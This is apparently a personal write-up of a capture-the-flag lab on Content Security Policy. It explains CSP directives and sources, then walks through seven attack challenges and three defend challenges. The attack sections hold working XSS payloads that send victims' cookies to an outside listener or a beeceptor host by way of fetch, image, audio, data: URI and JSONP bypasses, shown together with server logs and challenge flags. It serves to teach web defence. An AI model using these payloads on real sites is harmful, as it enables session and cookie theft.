# Content_Security_Policy 

> VOiD | Friday 20 August 2021 11:19:10 PM IST

My IP : 10.11.43.119
Target IP : 


#  Introduction
﻿Welcome to the CSP room! In this room, you'll learn what CSP is, what it's used for, and how to exploit flaws in a flawed CSP configuration. If you don't know what XSS (Cross-site scripting) is, I would recommend checking out the XSS room, as you'll need to have some experience with XSS.

What is CSP?

Content Security Policy, or CSP, is a policy usually sent via an HTTP response header from the webserver to your browser when requesting a page that describes which sources of content the browser should allow to be loaded in, and which ones should be blocked. In case an XSS or data injection vulnerability is found in a website, CSP is designed to prevent this vulnerability from being exploited until it's properly patched, and should serve as an extra layer of protection, not as your only line of defense. 

A CSP policy can also be included within the page's HTML source code, using the <meta> tag, such as this:
<meta http-equiv="Content-Security-Policy" content="script-src 'none'; object-src 'none';">


How can CSP be bypassed?

If you've found an XSS vulnerability in a website, but can't run any unauthorized code, the CSP of the website may be blocking it. What you'll need to do is read the policy sent by the server and see if any flaws in it could be exploited to successfully inject and execute your payload.



# Directives
The CSP specification contains quite a few directives. In this room, we'll focus on the most popular and important ones, but if you'd like to dive deeper into CSP directives, I'd recommend checking out the MDN page about them.

Some of the more commonly used directives are:

default-src - As the name states, this directive is used as the default, which means if a certain resource is trying to be loaded and there isn't a directive specified for its type, it falls back to default-src to verify if it's allowed to load.

script-src - This directive specifies the sources wherefrom JavaScript scripts can be loaded and executed.

connect-src - This directive specifies to which locations can JavaScript code perform AJAX requests (think XMLHTTPRequest or fetch).

style-src / img-src / font-src / media-src - These directives specify from which locations CSS stylesheets, images, fonts and media files (audio/video) respectively can be loaded

frame-src / child-src - This directive defines which locations can be embedded on the webpage via (i)frames.

report-uri - This is a special directive that will instruct the browser report all violations of your Content Security Policy via a POST request to a particular URL. This is useful if you're trying to find potential code injection vulnerabilities or locations where your CSP may break the functionality of your website. This directive is deprecated and will soon be replaced by the report-to directive, but for now, it remains in use. If you'd like to learn more about it, visit the MDN page for more information.

There are also quite a few other directives that I won't be focusing on in this course. If you're interested in the complete list of directives, content-security-policy.com provides this and much more useful information.




# Sources
Sources
After a directive in the policy comes a list of sources that specify wherefrom the particular resources are allowed to be loaded. Here are some of the most commonly used sources:

* - This source is a wildcard, which means content for that specific directive can be loaded from anywhere. It's recommended not to use this source for script-src as it will essentially allow loading scripts from any URL.

'none' - This is the opposite of the wildcard (*) source as it fully disallows loading resources of the specified directive type from anywhere. For example, if you know you won't be serving certain content on your website, such as music or videos, you can just set the directive to 'none' in your CSP like so: media-src 'none'

'self' - This source allows you to load resources that are hosted on the same protocol (http/https), hostname (example.com), and port (80/443) as the website. For example, if you're accessing a site such as https://example.com and it has the CSP header set to default-src 'self', you won't be able to load any scripts, images or stylesheets from https://subdomain.example.com, http://example.com or https://example.org.

'unsafe-inline' - This source allows the use of inline stylesheets, inline JavaScript and event attributes like onclick. This source is considered unsafe and should be avoided.

'unsafe-eval' - This source allows additional JavaScript code to be executed using functions such as eval() by JS code that's already permitted within the policy. This is usually safe unless a vulnerability is found in the code that runs on the page or the script-src sources are very loose, for example allowing any script to be loaded from a CDN.

example.com - This source would allow you to load resources from the domain example.com, but not its subdomains

*.example.com - This source would allow you to load resources from all of the subdomains of example.com, but not the base domain.

data: - Adding this source to a directive would allow resources to be loaded from a data: url. For script-src, this source is also considered unsafe and should be avoided. Here are some examples of data: urls:

data:image/png;base64,iVBORw0KGgo...
data:application/javascript,alert(1337)


There's also a couple of special sources, which are usually used in combination with some of the above to ensure only allowed resources are loaded, whilst maintaining convenience for the site owners.

nonce-: This allows a resource to load if it has a matching nonce attribute. The nonce is a random string that is generated for every request. It is usually used for loading inline JS code or CSS styles. It needs to be unique for every request, as if a nonce is predictable, it can be bypassed.
For example, if a server sends the following header: script-src 'unsafe-inline' 'nonce-GJYTxu', the browser will only execute scripts that have the attribute set, like so: <script nonce="GJYTxu">alert(1)</script>

sha256-: This is simply a SHA256 hash encoded via Base64 used as a checksum to verify that the content of the resource matches up with what's allowed by the server. Currently, sha256, sha384, and sha512 are by the CSP standard. This is usually used only for inline JS code or CSS styles but can be used to verify external scripts and/or stylesheets too. We can generate a SHA256 hash of an inline script we're intending to use by using a tool to generate it such as the one at report-uri.com or simply running it on a webpage with a restrictive CSP header and then extracting the hash from the console error.
For example, if we're looking to run the following JS on our website inline: alert(1337), we'll need to compute a SHA256 hash. I went ahead and did that, and the hash for the above code would be 'sha256-EKy4VsCHbHLlljt6SkTuD/eXpDbYHR1miZSY8h2DjDc='. Now we can add that to our policy, like so: script-src 'sha256-EKy4VsCHbHLlljt6SkTuD/eXpDbYHR1miZSY8h2DjDc='. Once that's added, the inline script should run as normal.


# Creating a Content Security Policy
Now that we've mentioned some of the most commonly used sources, we can talk about how to build your security policy for your website. For a more interactive way of building your policy, I'd recommend report-uri.com's CSP generator as it's a great tool that you can use to experiment with various CSP settings without having to type them out manually. 



When creating a CSP policy, I would recommend setting the default-src directive to 'self'. This ensures all resources by default will only be allowed to load from your website and nowhere else. If all the content (scripts, images, media...) is hosted on your site, this is all you'll need to set. If you load some of the content on your site from external sources (for example, images from a hosting site such as imgur.com), you can adjust the rest of the directives according to your needs.

When setting up the script-src directive and its sources, you should pay special attention to what you're allowing to load. If you're loading a script from an external source such as a CDN, make sure you're specifying the full URL of the script or a nonce/SHA hash of it and not just the hostname where it's hosted at, unless you're 100% sure no scripts that could be used to bypass your policy are hosted there. For example, if you're including jQuery from cdnjs on your website, you should include the full URL of the script (script-src cdnjs.cloudflare.com/ajax/.../jquery.min.js) or the SHA256 hash in your policy. Most CDNs allow you to get the script hash somewhere on their site. For example, on cdnjs, you can get it by clicking "Copy SRI" on the Copy dropdown.

Inline JS

If you need to include inline JavaScript or stylesheets in your website, you'll need to set up a nonce generator on the server-side, or compute SHA hashes of your inline scripts and then include them in your policy. There are loads of great libraries for most languages that allow you to do this with minimal effort. For example, if you're working with an Express-based website, I would recommend using the helmet-csp module available on npm, which randomly generates the nonce for you. If you're looking to hash your inline scripts, you can use an online tool such as report-uri.com's hash generator or you can use a tool such as AutoCSP to automatically generate your hashes for you. 



Note that if you serve JSONP endpoints on your website, you may need to take additional precautions. If you're not sure whether you serve JSONP endpoints or not, you probably don't.


# Bypassing a Content Security Policy
Since we now know how to create content security policies, let's learn how to find bypasses for them.

If you're looking for a quick way to check if your policy has any potential bypass vectors in it, I would recommend using Google's CSP Evaluator. It's able to detect various mistakes in any CSP configuration.



JSONP endpoints

﻿Some sites may serve JSONP endpoints which call a JavaScript function in their response. If the callback function of these can be changed, they could be used to bypass the CSP and demonstrate a proof of concept, such as displaying an alert box or potentially even exfiltrating sensitive information from the client such as cookies or authentication tokens. A lot of popular websites serve JSONP endpoints, which can be usually used to bypass a security policy on a website that uses their services. The JSONBee repo lists a good amount of the currently available JSONP endpoints that can be used to bypass a website's security policy.

Unsafe CSP configurations

Some sites may allow loading of resources from unsafe sources, for example by allowing data: URIs or using the 'unsafe-inline' source. For example, if a website allows loading scripts from data: URIs, you can simply bypass their policy by moving your payload to the src attribute of the script, like so: <script src="data:application/javascript,alert(1)"></script>



﻿Exfiltration

﻿To exfiltrate sensitive information, your client needs to connect to a webserver you control. For our purposes, we can use a free service such as Beeceptor to receive the information via the path of the request. If you have access to a paid service such as Burp Collaborator, you can use this instead.

If you prefer running a web server for exfiltration locally, you can set up a simple HTTP server using python by running python -m SimpleHTTPServer or python3 -m http.server.

If the website you're exploiting allows AJAX requests (via connect-src) to anywhere, you can create a fetch request to your server like so:

<script>fetch(`http://example.com/${document.cookie}`)</script>

When the script is triggered on the victim's machine, you'll see their cookies show up in your access log, like so:





If you found an XSS vulnerability and bypassed CSP, but can't leak any information with it via XHR requests or fetch, the connect-src policy may be blocking your requests. This can be bypassed if the website you're exploiting doesn't have strict settings for directives such as image-src and media-src, which can be abused to leak information.

For example, if a website is blocking all of your XHR requests but allows images to be loaded from any location, you can abuse this with JavaScript to load a specially crafted URL that masquerades as an image, like so:<script>(new Image()).src = `https://example.com/${encodeURIComponent(document.cookie)}`</script>

#  CSP Sandbox
Time to put your practice to test! I've created a VM that is intentionally vulnerable to XSS but uses various content security policies to mitigate it. You should be able to test what you've learned so far. It consists of 10 challenges, 7 of which are attack and 3 are defend, and also a playground where you can test your own CSP configurations.

You can access the introduction at http://10.10.120.18/. 



# Attack 1

Content-Security-Policy: default-src * 'unsafe-inline';

```js
<script>fetch(`http://10.11.43.119:8080/${document.cookie}`)</script>
```

```bash
python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.11.43.119 - - [21/Aug/2021 12:03:02] "GET / HTTP/1.1" 200 -
10.10.120.18 - - [21/Aug/2021 12:03:09] code 404, message File not found
10.10.120.18 - - [21/Aug/2021 12:03:09] "GET /flag=THM%7BTh4t_W4s_Pr3tty_3asy%7D HTTP/1.1" 404

```
Flag : THM{Th4t_W4s_Pr3tty_3asy}


# Attack 2


Content-Security-Policy: default-src *; style-src 'self'; script-src data:


```js
"/>'><script src=data:text/javascript,fetch(`http://10.11.43.119:8080/${document.cookie}`)></script>
```

```bash
10.11.43.119 - - [21/Aug/2021 12:12:32] "GET / HTTP/1.1" 200 -
10.10.120.18 - - [21/Aug/2021 12:12:40] code 404, message File not found
10.10.120.18 - - [21/Aug/2021 12:12:40] "GET /flag=THM%7BUs1ng_data:_1snt_Any_S4fer%7D HTTP/1.1" 404 -
```

Flag : THM{Us1ng_data:_1snt_Any_S4fer}

# Attack 3

Content-Security-Policy: default-src 'none'; img-src *; style-src 'self'; script-src 'unsafe-inline'

```js
"/><script>fetch(`http://10.11.43.119:8080/${document.cookie}`);</script>

"/><script>new Image().src="http://10.11.43.119:8080" + document.cookie;</script>
<script>(new Image()).src = `http://10.11.43.119:8080/${encodeURIComponent(document.cookie)}`</script>
```
```bash
10.11.43.119 - - [21/Aug/2021 12:50:36] "GET / HTTP/1.1" 200 -
10.10.120.18 - - [21/Aug/2021 12:50:54] code 404, message File not found
10.10.120.18 - - [21/Aug/2021 12:50:54] "GET /flag%3DTHM%7BTh4ts_N0t_4n_1m4ge!!%7D HTTP/1.1" 404 -
```

Flag : THM{Th4ts_N0t_4n_1m4ge!!}


# Attack 4

Content-Security-Policy: default-src 'none'; style-src * 'self'; script-src 'nonce-abcdef'


```js
<script nonce=abcdef>alert(1)</script>

<script nonce=abcdef>fetch(`http://10.11.43.119:8080/${document.cookie}`)</script>
<script nonce="abcdef">document.location='http://10.11.43.119:8080/${document.cookie};</script>

<link id="demo" rel=stylesheet href="" /><script nonce="abcdef">document.getElementById('demo').href="http://10.11.43.119:8080/" + document.cookie;</script>

```
```bash
10.11.43.119 - - [21/Aug/2021 19:13:23] "GET / HTTP/1.1" 200 -
10.10.113.82 - - [21/Aug/2021 19:13:30] code 404, message File not found
10.10.113.82 - - [21/Aug/2021 19:13:30] "GET /flag=THM%7BStyle_Y0ur_W3bs1teS%7D HTTP/1.1" 404 -
```

Flag : THM{Style_Y0ur_W3bs1teS}

# Attack 5 

Content-Security-Policy: default-src 'none'; style-src 'self'; img-src *; script-src 'unsafe-eval' *.google.com

```js

<script src="//accounts.google.com/o/oauth2/revoke?callback=eval(document.location='https://voids.free.beeceptor.com'.concat(document.cookie))"></script>

<script src="//accounts.google.com/o/oauth2/revoke?callback=eval(document.location='https://voids.free.beeceptor.com/'.concat(document.cookie))"></script>

```
Flag : THM{N0_JSONP_D0mains_Plz}


# Atatck 6

Content-Security-Policy: default-src 'none'; img-src *; style-src 'self'; script-src 'unsafe-eval' cdnjs.cloudflare.com

```js

```
Flag : THM{Trust_N0_CDN}

# Attack 7

Content-Security-Policy: default-src 'none'; media-src *; style-src 'self'; script-src 'self'

```js
<script src="/'; new Audio('http://10.11.43.119:8080/' + document.cookie); '"></script>

```

```bash
10.11.43.119 - - [21/Aug/2021 19:33:34] "GET / HTTP/1.1" 200 -
10.10.113.82 - - [21/Aug/2021 19:33:42] code 404, message File not found
10.10.113.82 - - [21/Aug/2021 19:33:42] "GET /flag=THM%7BTh1s_4udio_S0unds_N1ce%7D HTTP/1.1" 404 -
```

Flag : THM{Th1s_4udio_S0unds_N1ce}




# Defend 1

script-src 'self';

Welcome to defend-1!
The attackers are trying to XSS our admins! Quick, write a CSP policy that only allows the scripts we use!
(You can view our allowed scripts by checking the source code of this webpage.)
The attackers have sent the following:
You have successfully defended the server against attackers!
Here's your reward: THM{N0_0utside_S0urces}

# Defend 2

script-src 'nonce-ae3b00';

You have successfully defended the server against attackers!
Here's your reward: THM{M4k3_Sure_Y0ur_N0nce_1s_R4ndom}

# Defend 3 

https://report-uri.com/home/hash

console.log("__defend-3_REAL=true")

script-src 'sha256-8gQ3l0jVGr5ZXaOeym+1jciekP8wsfNgpZImdHthDRo=';

You have successfully defended the server against attackers!
Here's your reward: THM{Hash_Y0ur_1nl1ne_Scr1pts}